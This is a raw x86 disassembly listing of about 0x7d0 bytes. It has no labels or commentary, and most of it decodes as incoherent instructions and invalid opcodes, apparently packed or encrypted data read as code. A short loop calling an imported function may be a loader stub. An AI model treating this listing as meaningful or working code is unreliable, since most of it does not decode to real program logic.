  40a028:	pop    eax
  40a02a:	mov    dl,BYTE PTR [eax-0x1be5185c]
  40a030:	repz sub edi,ecx
  40a033:	loopne 0x40a01b
  40a035:	lahf   
  40a036:	ins    BYTE PTR es:[edi],dx
  40a037:	es scas al,BYTE PTR es:[edi]
  40a039:	dec    ebp
  40a03a:	mov    cl,0xee
  40a03c:	add    eax,0x81620e6d
  40a041:	call   0xf36b:0x7e96dccf
  40a048:	nop
  40a049:	int3   
  40a04a:	push   edx
  40a04b:	sub    BYTE PTR [ebp+0x5a],0x17
  40a04f:	inc    ecx
  40a050:	(bad)  
  40a051:	loopne 0x40a08e
  40a053:	push   0x5c
  40a055:	push   esp
  40a056:	sbb    al,0xa1
  40a058:	pop    DWORD PTR [eax]
  40a05a:	xchg   ebp,eax
  40a05b:	cmp    eax,0xdf3cecc6
  40a060:	push   ds
  40a061:	mov    esp,0x880ce3f5
  40a066:	push   edx
  40a067:	test   al,0xc7
  40a069:	adc    edx,DWORD PTR [edx-0x259970be]
  40a06f:	shr    DWORD PTR [edx],0x5f
  40a072:	add    ch,BYTE PTR [esi-0x2a]
  40a075:	push   esi
  40a076:	and    DWORD PTR [eax-0x617f35d6],ebp
  40a07c:	retf   
  40a07d:	sub    al,0x82
  40a07f:	xchg   ecx,eax
  40a080:	jle    0x40a081
  40a082:	jecxz  0x40a03a
  40a084:	dec    ebx
  40a085:	clc    
  40a086:	xlat   BYTE PTR ds:[ebx]
  40a087:	sbb    al,dh
  40a089:	(bad)  
  40a08a:	loopne 0x40a0be
  40a08c:	pop    ds
  40a08d:	sub    dh,BYTE PTR [esi-0x58]
  40a090:	add    al,0x70
  40a092:	add    eax,0x221664ec
  40a097:	cmp    BYTE PTR [edi-0x7b],bh
  40a09a:	pop    eax
  40a09b:	mov    eax,ds:0xbee627ea
  40a0a0:	mov    eax,0x5c449210
  40a0a5:	rcl    dl,1
  40a0a7:	popa   
  40a0a8:	mov    ebx,0x87854d2a
  40a0ad:	les    ecx,FWORD PTR [eax+eax*2]
  40a0b0:	jnp    0x40a0fd
  40a0b2:	dec    ebp
  40a0b3:	push   eax
  40a0b4:	aaa    
  40a0b5:	sub    edx,edx
  40a0b7:	stc    
  40a0b8:	mov    bh,0x82
  40a0ba:	jae    0x40a066
  40a0bc:	mov    edx,0x78376331
  40a0c1:	inc    ecx
  40a0c2:	mov    edi,0x178e68c7
  40a0c7:	aam    0xfa
  40a0c9:	xor    bh,BYTE PTR [edi+0x5a41ea7f]
  40a0cf:	adc    edx,DWORD PTR [edi-0x39]
  40a0d2:	mov    ecx,0x434a1231
  40a0d7:	out    0xa1,eax
  40a0d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0da:	add    bh,al
  40a0dc:	push   esp
  40a0dd:	mov    eax,ds:0xee64d682
  40a0e2:	mov    BYTE PTR [edi+0x7b36e19e],ah
  40a0e8:	ret    
  40a0e9:	outs   dx,BYTE PTR ds:[esi]
  40a0ea:	in     al,dx
  40a0eb:	iret   
  40a0ec:	out    0xde,al
  40a0ee:	sahf   
  40a0ef:	fucom  st(0)
  40a0f1:	xchg   DWORD PTR [ecx+0x1714e5b],edi
  40a0f7:	shl    BYTE PTR [esi+0x6e75f67e],0x28
  40a0fe:	repnz in eax,dx
  40a100:	add    eax,0x1254fff5
  40a105:	es scas al,BYTE PTR es:[edi]
  40a107:	cli    
  40a108:	pop    ecx
  40a109:	xchg   BYTE PTR [edx],ah
  40a10b:	fwait
  40a10c:	or     al,0x32
  40a10e:	add    DWORD PTR [ecx],ecx
  40a110:	retf   
  40a111:	leave  
  40a112:	sahf   
  40a113:	dec    esi
  40a114:	xchg   esp,eax
  40a115:	js     0x40a11f
  40a117:	cdq    
  40a118:	sbb    al,0x55
  40a11a:	jns    0x40a153
  40a11c:	inc    ebp
  40a11d:	ficom  DWORD PTR [esi-0xab30c49]
  40a123:	clc    
  40a124:	cs in  eax,0x4a
  40a127:	and    eax,0x77af0166
  40a12c:	jge    0x40a0fe
  40a12e:	cwde   
  40a12f:	out    dx,al
  40a130:	jl     0x40a150
  40a132:	das    
  40a133:	iret   
  40a134:	mov    ebx,0xa4e84177
  40a139:	rcr    esi,cl
  40a13b:	or     eax,0x2ed5b4eb
  40a140:	jg     0x40a0ea
  40a142:	aaa    
  40a143:	mov    ds:0xd3f5ef39,eax
  40a148:	ins    DWORD PTR es:[edi],dx
  40a149:	out    0x14,eax
  40a14b:	lea    esp,[ebp-0x552827b2]
  40a151:	cmp    eax,0x1b5f6c27
  40a156:	imul   esp,DWORD PTR [ebx],0x64edade2
  40a15c:	pusha  
  40a15d:	xchg   ecx,eax
  40a15e:	push   edx
  40a15f:	stc    
  40a160:	popa   
  40a161:	dec    eax
  40a162:	mov    edx,0x330022a8
  40a167:	(bad)  
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	(bad)  
  40a17a:	fsincos 
  40a17c:	xchg   ecx,eax
  40a17d:	cmp    edi,esp
  40a17f:	jle    0x40a1ff
  40a181:	cs jge 0x40a202
  40a184:	jle    0x40a203
  40a186:	push   eax
  40a187:	jb     0x40a182
  40a189:	cdq    
  40a18a:	mov    ecx,0x11dd4f10
  40a18f:	fld    DWORD PTR [esi]
  40a191:	shl    DWORD PTR [ecx+0x1dedbf3],cl
  40a197:	dec    edi
  40a198:	add    al,0x8e
  40a19a:	or     eax,0x657dd7f7
  40a19f:	or     eax,0x84a7dde7
  40a1a4:	fnstcw WORD PTR [ebx]
  40a1a6:	fptan  
  40a1a8:	fdiv   DWORD PTR [ebx+ebx*8]
  40a1ab:	adc    DWORD PTR ds:0x9c79cb11,esi
  40a1b1:	imul   ebp,esp,0xf8093946
  40a1b7:	push   es
  40a1b8:	push   edi
  40a1b9:	sbb    bl,BYTE PTR [edx+0x2120bb7f]
  40a1bf:	push   eax
  40a1c0:	xchg   ebx,eax
  40a1c1:	into   
  40a1c2:	cmp    dl,BYTE PTR [ebp-0x59]
  40a1c5:	or     eax,0x83765bd8
  40a1ca:	mov    ecx,0x15f2c5b1
  40a1cf:	jge    0x40a159
  40a1d1:	out    dx,al
  40a1d2:	sub    esp,DWORD PTR [ebp-0x20]
  40a1d5:	loopne 0x40a209
  40a1d7:	lea    edi,[edi-0x48]
  40a1da:	xlat   BYTE PTR ds:[ebx]
  40a1db:	pop    edx
  40a1dc:	shl    BYTE PTR [ebx+0x4d22f7ee],1
  40a1e2:	(bad)  
  40a1e3:	scas   eax,DWORD PTR es:[edi]
  40a1e4:	fcomp  DWORD PTR [ecx+0x713d7d87]
  40a1ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1eb:	pminub mm5,mm7
  40a1ee:	and    eax,0x2ea95d01
  40a1f3:	pop    ecx
  40a1f4:	jo     0x40a22b
  40a1f6:	xor    ch,ah
  40a1f8:	mov    ds:0x9b081820,al
  40a1fd:	cmp    bh,bh
  40a1ff:	lea    di,[esp+eax*1+0xf4b06cc]
  40a207:	cwde   
  40a208:	mov    al,ds:0xc8fe7ed9
  40a20d:	ret    
  40a20e:	cs adc al,0xb7
  40a211:	(bad)  
  40a212:	idiv   BYTE PTR [edi+0x37]
  40a215:	mov    ebp,0x6fd2ade5
  40a21a:	xor    eax,0x558318b8
  40a21f:	or     ebx,DWORD PTR [ecx]
  40a221:	pop    es
  40a222:	and    eax,DWORD PTR [esi+0x79d896a3]
  40a228:	nop
  40a229:	adc    esp,esi
  40a22b:	(bad)  
  40a22c:	mov    al,0xb6
  40a22e:	xchg   esp,eax
  40a22f:	mov    bh,0xba
  40a231:	dec    eax
  40a232:	jecxz  0x40a1e3
  40a234:	pop    edx
  40a235:	cmp    DWORD PTR [ecx+0x8],esp
  40a238:	adc    cl,BYTE PTR [edi]
  40a23a:	out    0xd6,al
  40a23c:	push   esp
  40a23d:	sub    bh,dl
  40a23f:	sbb    al,0xd3
  40a241:	jg     0x40a2a6
  40a243:	adc    eax,0xa2e970b
  40a248:	sub    bh,cl
  40a24a:	mov    cl,0x2d
  40a24c:	mov    ah,0x9b
  40a24e:	mov    ch,BYTE PTR es:0x8dd5f081
  40a255:	push   ecx
  40a256:	sub    ch,al
  40a258:	sti    
  40a259:	or     al,0x2e
  40a25b:	pop    es
  40a25c:	or     BYTE PTR [edi+0x61],ah
  40a25f:	adc    ecx,edi
  40a261:	dec    edi
  40a262:	mov    cl,dl
  40a264:	pushf  
  40a265:	pushf  
  40a266:	cmp    eax,0x6fb1ecfe
  40a26b:	dec    edx
  40a26c:	out    0x6c,eax
  40a26e:	push   es
  40a26f:	dec    edx
  40a270:	enter  0x80ec,0x85
  40a274:	jl     0x40a2d9
  40a276:	ins    BYTE PTR es:[edi],dx
  40a277:	retf   
  40a278:	jns    0x40a26e
  40a27a:	lahf   
  40a27b:	out    dx,eax
  40a27c:	out    0xd7,eax
  40a27e:	out    0xc4,al
  40a280:	cmc    
  40a281:	push   ebx
  40a282:	test   BYTE PTR [eax-0x648190],bl
  40a288:	fst    DWORD PTR [ebx+edx*2+0x7f]
  40a28c:	xor    cl,BYTE PTR [eax]
  40a28e:	mov    esp,0xcd2f8c16
  40a293:	out    0x4e,eax
  40a295:	adc    edx,DWORD PTR [ebp-0x1db220c4]
  40a29b:	mov    BYTE PTR [ecx+edi*1-0xe],bh
  40a29f:	pop    ebp
  40a2a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2a1:	pushf  
  40a2a2:	pop    ecx
  40a2a3:	in     al,0x36
  40a2a5:	popf   
  40a2a6:	mov    ecx,0xd05399db
  40a2ab:	or     BYTE PTR [ebp+0x10],al
  40a2ae:	jg     0x40a32b
  40a2b0:	sbb    ch,BYTE PTR [edi+0x66b644fe]
  40a2b6:	mov    al,ds:0x41837f64
  40a2bb:	inc    esi
  40a2bc:	or     esi,DWORD PTR [edi-0x2b]
  40a2bf:	test   eax,esp
  40a2c1:	cmp    DWORD PTR [ebx],ecx
  40a2c3:	mov    ah,0x88
  40a2c5:	inc    edx
  40a2c6:	aam    0x37
  40a2c8:	int3   
  40a2c9:	or     DWORD PTR [esi-0x84c1863],esp
  40a2cf:	fiadd  WORD PTR [edi]
  40a2d1:	fs sbb eax,0x3a5f4a90
  40a2d7:	inc    edx
  40a2d8:	clc    
  40a2d9:	xor    esi,ebp
  40a2db:	sar    DWORD PTR [ebx-0x5c9420db],1
  40a2e1:	lock sbb al,0xc3
  40a2e4:	js     0x40a304
  40a2e6:	or     DWORD PTR [edi+0x2c7170dd],edi
  40a2ec:	or     DWORD PTR [ecx+0x2bb178a5],ebp
  40a2f2:	mov    al,ds:0xcc871b4f
  40a2f7:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2f9:	mov    bh,0xa8
  40a2fb:	daa    
  40a2fc:	scas   eax,DWORD PTR es:[edi]
  40a2fd:	sub    dl,BYTE PTR [ebp*8+0x5ad3eaa5]
  40a304:	leave  
  40a305:	das    
  40a306:	push   ds
  40a307:	rol    al,cl
  40a309:	pop    edx
  40a30a:	in     eax,dx
  40a30b:	mov    esi,0x9d29b09b
  40a310:	inc    ebx
  40a311:	cwde   
  40a312:	or     edi,ecx
  40a314:	popf   
  40a315:	or     al,0xa9
  40a317:	ja     0x40a2be
  40a319:	mov    WORD PTR [ecx],cs
  40a31b:	pop    esi
  40a31c:	pop    ds
  40a31d:	add    DWORD PTR [edx+ecx*4-0x55a43cb7],eax
  40a324:	and    al,0x13
  40a326:	pop    ds
  40a327:	xchg   ebx,eax
  40a328:	rol    BYTE PTR ss:[ebx-0xb],1
  40a32c:	xchg   ecx,eax
  40a32d:	hlt    
  40a32e:	loopne 0x40a30d
  40a330:	scas   al,BYTE PTR es:[edi]
  40a331:	outs   dx,BYTE PTR ds:[esi]
  40a332:	je     0x40a326
  40a334:	pop    edx
  40a335:	and    dl,dh
  40a337:	clc    
  40a338:	jmp    0x7c76:0x3d6b5902
  40a33f:	or     eax,0x70fef161
  40a344:	enter  0x5dda,0x94
  40a348:	ret    0xcefc
  40a34b:	shl    al,1
  40a34d:	jp     0x40a3b8
  40a34f:	ret    
  40a350:	add    al,0x60
  40a352:	or     eax,0xb7bcd27d
  40a357:	jmp    0xa3aa:0x87ced471
  40a35e:	pop    ss
  40a35f:	out    0x60,eax
  40a361:	retf   0x67b4
  40a364:	mov    edi,0x843da14a
  40a369:	iret   
  40a36a:	and    DWORD PTR [ebx-0x76bef8e9],esp
  40a370:	cs mov cl,0x50
  40a373:	popa   
  40a374:	mov    ah,0xec
  40a376:	sub    BYTE PTR [eax],0xf2
  40a379:	lods   eax,DWORD PTR ds:[esi]
  40a37a:	ins    BYTE PTR es:[edi],dx
  40a37b:	sbb    eax,0x9b1d1fc8
  40a380:	and    BYTE PTR [eax+0x70],bl
  40a383:	in     al,0xec
  40a385:	ins    BYTE PTR es:[edi],dx
  40a386:	inc    edx
  40a387:	fidiv  DWORD PTR [ecx*4-0x1940245f]
  40a38e:	xchg   edx,eax
  40a38f:	mov    cl,0x29
  40a391:	popf   
  40a392:	out    0xd3,al
  40a394:	push   edi
  40a395:	test   eax,0xbfb5aac8
  40a39a:	icebp  
  40a39b:	cmp    esi,esi
  40a39d:	mov    eax,0x1445c380
  40a3a2:	sub    ah,BYTE PTR [eax-0x28]
  40a3a5:	pop    edx
  40a3a6:	lds    ebx,FWORD PTR [edi-0x6e]
  40a3a9:	pop    ds
  40a3aa:	jns    0x40a3d8
  40a3ac:	jge    0x40a3fa
  40a3ae:	or     DWORD PTR [edi+0xd99e6bc],0x30
  40a3b5:	xlat   BYTE PTR ds:[ebx]
  40a3b6:	xor    esi,ecx
  40a3b8:	push   esi
  40a3b9:	dec    esp
  40a3ba:	sbb    DWORD PTR [esi-0x772c0eb9],ebp
  40a3c0:	fucomi st,st(0)
  40a3c2:	fistp  WORD PTR [edx+0x5a]
  40a3c5:	adc    ch,BYTE PTR [eax]
  40a3c7:	(bad)  
  40a3c8:	inc    ebp
  40a3c9:	push   0x70
  40a3cb:	add    bl,BYTE PTR [edx-0xebe8abc]
  40a3d1:	push   0x3e
  40a3d3:	fld    DWORD PTR [ebp+0x187e4d7]
  40a3d9:	cmp    bl,BYTE PTR [eax+0x7576da7d]
  40a3df:	jle    0x40a3b3
  40a3e1:	rdpmc  
  40a3e3:	mov    eax,ds:0x25e63
  40a3e8:	add    al,0xfa
  40a3ea:	(bad)  
  40a3eb:	mov    ds:0x83aea501,al
  40a3f0:	mov    al,ds:0x9487c6d7
  40a3f5:	jo     0x40a37e
  40a3f7:	gs aas 
  40a3f9:	mov    ah,dl
  40a3fb:	inc    esp
  40a3fc:	jecxz  0x40a3f8
  40a3fe:	je     0x40a47f
  40a400:	mov    ah,0xa9
  40a402:	pop    es
  40a403:	xchg   BYTE PTR [eax+0x594079fe],cl
  40a409:	mov    eax,ds:0xb02fa543
  40a40e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a40f:	jno    0x40a400
  40a411:	push   edi
  40a412:	jg     0x40a426
  40a414:	or     DWORD PTR [ecx+ebp*4-0x4],eax
  40a418:	adc    DWORD PTR [esi+0x78],edx
  40a41b:	jbe    0x40a3a9
  40a41d:	cmp    esp,DWORD PTR ds:0xf3eeee1a
  40a423:	clc    
  40a424:	sub    al,0x3a
  40a426:	sub    al,0xb9
  40a428:	jae    0x40a3b9
  40a42a:	ret    
  40a42b:	stos   BYTE PTR es:[edi],al
  40a42c:	lahf   
  40a42d:	ret    
  40a42e:	and    al,0x1a
  40a430:	inc    esi
  40a431:	imul   ecx,DWORD PTR [ebp-0x35],0xffffffc7
  40a435:	and    dl,BYTE PTR [ebp+0x6e3aa648]
  40a43b:	retf   0x148a
  40a43e:	rcl    edi,1
  40a440:	sbb    al,BYTE PTR [esi-0x480b19e]
  40a446:	int3   
  40a447:	push   eax
  40a448:	frstor [ebx-0x3d]
  40a44b:	scas   al,BYTE PTR es:[edi]
  40a44c:	shl    DWORD PTR [ecx+0x29],0x17
  40a450:	imul   esp,edx,0x19ba0675
  40a456:	fsubr  QWORD PTR [edi+0x5531e01a]
  40a45c:	push   ebx
  40a45d:	mov    al,ds:0x45cc8bb3
  40a462:	mov    ah,0x7f
  40a464:	xor    ebp,DWORD PTR [ecx+esi*1]
  40a467:	mov    ebx,0xa414d4a8
  40a46c:	sbb    edi,ecx
  40a46e:	and    ecx,DWORD PTR [ecx+0x55c926e6]
  40a474:	fdivr  QWORD PTR [edi+0x383ce2ce]
  40a47a:	lds    eax,FWORD PTR [esi]
  40a47c:	push   eax
  40a47d:	ds xor dh,dl
  40a480:	add    eax,0xe05efd80
  40a485:	(bad)  
  40a486:	popa   
  40a487:	xor    al,0xd6
  40a48a:	jmp    DWORD PTR [esi+0x1e]
  40a48d:	mov    edx,0x59984116
  40a492:	leave  
  40a493:	lahf   
  40a494:	call   0xac8d:0x37b7e257
  40a49b:	jge    0x40a41d
  40a49d:	test   BYTE PTR [edx],ah
  40a49f:	fwait
  40a4a0:	minps  xmm7,xmm6
  40a4a3:	adc    edi,DWORD PTR [ecx]
  40a4a5:	std    
  40a4a6:	or     eax,0x3c3001cd
  40a4ab:	xchg   ecx,eax
  40a4ac:	xchg   esp,eax
  40a4ad:	mov    WORD PTR [ecx-0x15],ds
  40a4b0:	or     eax,0x60029ddd
  40a4b5:	add    eax,edi
  40a4b7:	and    DWORD PTR ds:0x4302f1,0x0
  40a4c1:	xor    ebx,ebx
  40a4c3:	or     ebx,DWORD PTR ds:0x4302f1
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x4302f1,ebx
  40a4d0:	cmp    DWORD PTR ds:0x4302f1,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42eabb
  40a4e8:	cmp    DWORD PTR ds:0x4302f1,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	ss mov bl,dh
  40a513:	xchg   bh,al
  40a515:	jmp    0x2ebf23fc
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a53c
  40a51e:	xchg   ebx,eax
  40a51f:	sub    ch,BYTE PTR [edx+0x69]
  40a522:	js     0x40a5a2
  40a524:	mov    bl,0x38
  40a526:	mov    ebx,0xff5d625c
  40a52b:	out    dx,al
  40a52c:	icebp  
  40a52d:	pop    ebx
  40a52e:	loopne 0x40a54f
  40a530:	sbb    DWORD PTR [ecx+0x78],0xe421082b
  40a537:	push   0x64
  40a539:	add    al,0x17
  40a53b:	or     cl,ah
  40a53d:	retf   
  40a53e:	mov    edx,0x286bb526
  40a543:	inc    esi
  40a544:	adc    al,0x77
  40a546:	sub    eax,esp
  40a548:	add    ah,BYTE PTR [ebp-0x7a93c9d5]
  40a54e:	add    al,0x1b
  40a550:	mov    cl,0x6f
  40a552:	mov    eax,0xd939a861
  40a557:	test   BYTE PTR [eax+0x65],bh
  40a55a:	sbb    ebx,eax
  40a55c:	les    esp,FWORD PTR [edi]
  40a55e:	mov    WORD PTR [eax+0x55411058],?
  40a564:	inc    eax
  40a565:	sar    BYTE PTR [esi+0x19fe6d92],1
  40a56b:	(bad)  
  40a56d:	or     al,0x91
  40a56f:	(bad)  
  40a570:	jle    0x40a52b
  40a572:	out    dx,al
  40a573:	pop    ds
  40a574:	shl    BYTE PTR [ecx],1
  40a576:	push   edx
  40a577:	cmp    al,0x8c
  40a579:	mov    al,ds:0x8a732351
  40a57e:	(bad)  
  40a57f:	outs   dx,DWORD PTR ds:[esi]
  40a580:	mov    DWORD PTR [edi+edx*4],edx
  40a583:	not    ch
  40a585:	jne    0x40a5f9
  40a587:	inc    edi
  40a588:	(bad)  [ebp-0x4c37543e]
  40a58e:	dec    eax
  40a58f:	sbb    al,0xf1
  40a591:	fisttp WORD PTR [ecx-0x11a8517]
  40a597:	or     DWORD PTR [edi+ebx*2-0x50da86fe],0xfffffff7
  40a59f:	cmp    DWORD PTR [esi+eax*2],eax
  40a5a2:	rcl    BYTE PTR [edx+edi*8-0x3e49939f],cl
  40a5a9:	sub    DWORD PTR [edi+0x69],eax
  40a5ac:	adc    al,0x8
  40a5ae:	lahf   
  40a5af:	jnp    0x40a560
  40a5b1:	fdivr  DWORD PTR [ecx]
  40a5b3:	into   
  40a5b4:	inc    edi
  40a5b5:	mov    ch,0xed
  40a5b7:	hlt    
  40a5b8:	sbb    DWORD PTR [esi+0x54],edi
  40a5bb:	pop    ss
  40a5bc:	mov    ch,0x93
  40a5be:	push   cs
  40a5bf:	in     al,dx
  40a5c0:	dec    ebp
  40a5c1:	or     al,0x7d
  40a5c3:	cmp    eax,DWORD PTR [esi]
  40a5c5:	sub    al,0x64
  40a5c7:	popf   
  40a5c8:	(bad)  
  40a5c9:	frstor [ecx-0x4510233d]
  40a5cf:	pop    ebp
  40a5d0:	and    al,0xda
  40a5d2:	in     al,0x22
  40a5d4:	sbb    DWORD PTR [eax-0x4d],edx
  40a5d7:	push   0xffffffe9
  40a5d9:	sbb    BYTE PTR [ebx-0x63],dh
  40a5dc:	xchg   DWORD PTR [edx],eax
  40a5de:	xor    DWORD PTR [esi],edi
  40a5e0:	xchg   edi,eax
  40a5e1:	loope  0x40a64f
  40a5e3:	out    0xd9,al
  40a5e5:	cmp    esp,DWORD PTR [esi-0x9]
  40a5e8:	push   edx
  40a5e9:	jp     0x40a575
  40a5eb:	scas   eax,DWORD PTR es:[edi]
  40a5ec:	and    DWORD PTR [ebp-0x6c],0x12f6f85a
  40a5f3:	dec    BYTE PTR ds:[ebp-0x10]
  40a5f7:	lds    eax,FWORD PTR [esi-0x7bfd00af]
  40a5fd:	push   edx
  40a5fe:	out    dx,eax
  40a5ff:	inc    edi
  40a600:	push   cs
  40a601:	stc    
  40a602:	xor    al,0xe6
  40a604:	bound  eax,QWORD PTR [edi+0x34]
  40a607:	pop    gs
  40a609:	mov    esp,0xb604af2e
  40a60e:	call   0xf9ca:0x34095fcf
  40a615:	mov    bh,BYTE PTR [edi-0x4f]
  40a618:	dec    edi
  40a619:	gs pop ecx
  40a61b:	shl    BYTE PTR [edx],cl
  40a61d:	test   eax,0xd8215bb4
  40a622:	cmp    al,0xfc
  40a624:	fwait
  40a625:	jle    0x40a633
  40a627:	outs   dx,DWORD PTR ds:[esi]
  40a628:	lods   eax,DWORD PTR ds:[esi]
  40a629:	dec    edi
  40a62a:	sar    edi,cl
  40a62c:	(bad)  
  40a62e:	add    DWORD PTR [esi+ebx*8+0x7de784a7],eax
  40a635:	mov    edi,0xbc605cc8
  40a63a:	sbb    DWORD PTR [edx+0xf],0x50
  40a63e:	mov    gs,ecx
  40a640:	cmp    BYTE PTR [edi+eax*1+0x238c0be8],ch
  40a647:	addr16 lahf 
  40a649:	jle    0x40a609
  40a64b:	fistp  DWORD PTR [edi-0x4]
  40a64e:	test   DWORD PTR [ecx+ebp*2+0x7],ecx
  40a652:	es xchg ebp,eax
  40a654:	sub    BYTE PTR [ebp-0x7e33c7c5],dl
  40a65a:	sub    dh,bl
  40a65c:	and    ebx,edi
  40a65e:	mov    dl,0xd4
  40a660:	fstp   DWORD PTR [ebp-0x1a927747]
  40a666:	leave  
  40a667:	int3   
  40a668:	jp     0x40a6dc
  40a66a:	xlat   BYTE PTR ds:[ebx]
  40a66b:	mov    ebp,0x9f55a32
  40a670:	sbb    BYTE PTR [ebp-0x32],0x78
  40a674:	sub    esp,esp
  40a676:	(bad)  [eax]
  40a678:	sub    al,0x50
  40a67a:	xchg   BYTE PTR [edi],cl
  40a67c:	retf   0x919
  40a67f:	sahf   
  40a680:	inc    DWORD PTR [eax]
  40a682:	jno    0x40a6a0
  40a684:	and    ah,BYTE PTR [eax-0x3de56ed4]
  40a68a:	js     0x40a692
  40a68c:	mov    esi,0xc55ab15
  40a691:	shr    BYTE PTR [ecx-0x1f],1
  40a694:	loopne 0x40a69b
  40a696:	push   ss
  40a697:	pop    esi
  40a698:	pop    eax
  40a699:	mov    esi,0xdc0230c8
  40a69e:	mov    BYTE PTR [ebp+ebp*4+0xd],bh
  40a6a2:	call   0x589a:0x463d13d8
  40a6a9:	xchg   edx,eax
  40a6aa:	adc    eax,DWORD PTR [ebx]
  40a6ac:	sub    bh,ah
  40a6ae:	sti    
  40a6af:	xor    eax,DWORD PTR [ecx]
  40a6b1:	mov    dh,0x18
  40a6b3:	call   0x1639ebb1
  40a6b8:	stc    
  40a6b9:	xchg   BYTE PTR [ebp-0x36026a63],ah
  40a6bf:	outs   dx,BYTE PTR ds:[esi]
  40a6c0:	sbb    DWORD PTR [edx-0x6b],0xc706199b
  40a6c7:	out    0x74,eax
  40a6c9:	clc    
  40a6ca:	jns    0x40a682
  40a6cc:	cmp    dh,BYTE PTR [ecx]
  40a6ce:	out    0x4c,al
  40a6d0:	mov    ecx,0xdc68d2a3
  40a6d5:	outs   dx,DWORD PTR ds:[esi]
  40a6d6:	jmp    0xac9a:0xbfa17b50
  40a6dd:	xor    al,0xa7
  40a6df:	mov    esp,0xd8ec4e01
  40a6e4:	add    DWORD PTR [eax-0x33ef69b3],ebx
  40a6ea:	xchg   esi,eax
  40a6eb:	das    
  40a6ec:	push   esi
  40a6ed:	sub    BYTE PTR [edi],ah
  40a6ef:	scas   eax,DWORD PTR es:[edi]
  40a6f0:	sbb    eax,0xc7acddc
  40a6f5:	xchg   DWORD PTR [ebp-0x735b6e04],esp
  40a6fb:	ret    
  40a6fc:	sbb    al,0xc9
  40a6fe:	mov    ebx,0x60303079
  40a703:	cmp    BYTE PTR [esi],0x8
  40a706:	mov    ah,0xd7
  40a708:	into   
  40a709:	outs   dx,DWORD PTR ds:[esi]
  40a70a:	mov    esp,fs
  40a70c:	xchg   ebx,eax
  40a70d:	(bad)  
  40a70f:	stc    
  40a710:	add    eax,0x6bccee77
  40a715:	dec    edi
  40a716:	cmp    eax,0x666bcc46
  40a71b:	outs   dx,DWORD PTR ds:[esi]
  40a71c:	dec    esi
  40a71d:	adc    DWORD PTR [esi],esp
  40a71f:	sahf   
  40a720:	push   esi
  40a721:	test   ch,bh
  40a723:	and    ecx,DWORD PTR [esi+0x795a599a]
  40a729:	int3   
  40a72a:	cli    
  40a72b:	lock cmp BYTE PTR [ecx+0x53],ch
  40a72f:	loopne 0x40a711
  40a731:	jmp    FWORD PTR [esi-0x6d3c2372]
  40a737:	add    ecx,DWORD PTR [esi-0x4502c950]
  40a73d:	xchg   esp,eax
  40a73e:	(bad)  
  40a73f:	mov    dh,0x8f
  40a741:	adc    esp,esi
  40a743:	(bad)  
  40a744:	cmp    al,0x22
  40a746:	push   ebp
  40a747:	cs pop ds
  40a749:	loop   0x40a704
  40a74b:	add    esi,DWORD PTR [edi]
  40a74d:	push   es
  40a74e:	popf   
  40a74f:	pop    ss
  40a750:	push   ds
  40a751:	cmp    ch,ah
  40a753:	jmp    0x8d45328c
  40a758:	jmp    0x9277d7e3
  40a75d:	pop    ds
  40a75e:	cmp    al,0xd0
  40a760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a761:	data16 jg 0x40a731
  40a764:	sbb    DWORD PTR [edx-0x73],esi
  40a767:	jmp    0x3b9d:0x88df45bf
  40a76e:	add    BYTE PTR [eax-0x7c57907f],ah
  40a774:	inc    ecx
  40a775:	std    
  40a776:	pop    ss
  40a777:	jbe    0x40a797
  40a779:	shl    dh,1
  40a77b:	mov    bl,0x86
  40a77d:	hlt    
  40a77e:	sub    esi,esi
  40a780:	or     esi,DWORD PTR [ecx+0x5ea36c32]
  40a786:	mov    dl,0x68
  40a788:	xlat   BYTE PTR ds:[ebx]
  40a789:	dec    ecx
  40a78a:	mov    dh,0xbd
  40a78c:	addr16 hlt 
  40a78e:	push   ecx
  40a78f:	or     eax,esi
  40a791:	sub    DWORD PTR [ebx+edx*4+0x765908b6],edi
  40a798:	fistp  DWORD PTR ds:0xf92ba267
  40a79e:	and    dh,ch
  40a7a0:	aad    0x7b
  40a7a2:	push   ss
  40a7a3:	jecxz  0x40a790
  40a7a5:	les    esp,FWORD PTR [edi-0x2d]
  40a7a8:	ret    0xdcd
  40a7ab:	jge    0x40a73e
  40a7ad:	xchg   BYTE PTR [ecx+0x7d6de083],cl
  40a7b3:	cwde   
  40a7b4:	rcr    BYTE PTR [esi],1
  40a7b6:	sub    al,0x13
  40a7b8:	sbb    BYTE PTR [edx+esi*1-0x4c],dl
  40a7bc:	add    al,0x4e
  40a7be:	mov    eax,DWORD PTR es:[eax]
  40a7c1:	xchg   DWORD PTR [ecx+esi*1],eax
  40a7c4:	std    
  40a7c5:	add    DWORD PTR [esp+edx*2],ebx
  40a7c8:	in     al,0x8e
  40a7ca:	xor    eax,0x5dfa5a4d
  40a7cf:	aas    
  40a7d0:	enter  0x4c94,0x13
  40a7d4:	ret    0xb7cb
  40a7d7:	fisubr DWORD PTR [ebx]
  40a7d9:	data16 loop 0x40a7c5
  40a7dc:	pop    ds
  40a7dd:	das    
  40a7de:	cvtps2pd xmm7,xmm4
  40a7e1:	ss jmp 0x40a79c
  40a7e4:	push   ebx
  40a7e5:	xor    DWORD PTR [ebx-0x5679cada],eax
  40a7eb:	es xchg ecx,eax
  40a7ed:	fnstenv ds:0xd16b6052
  40a7f3:	pusha  
  40a7f4:	mov    al,ds:0x99ab6a54
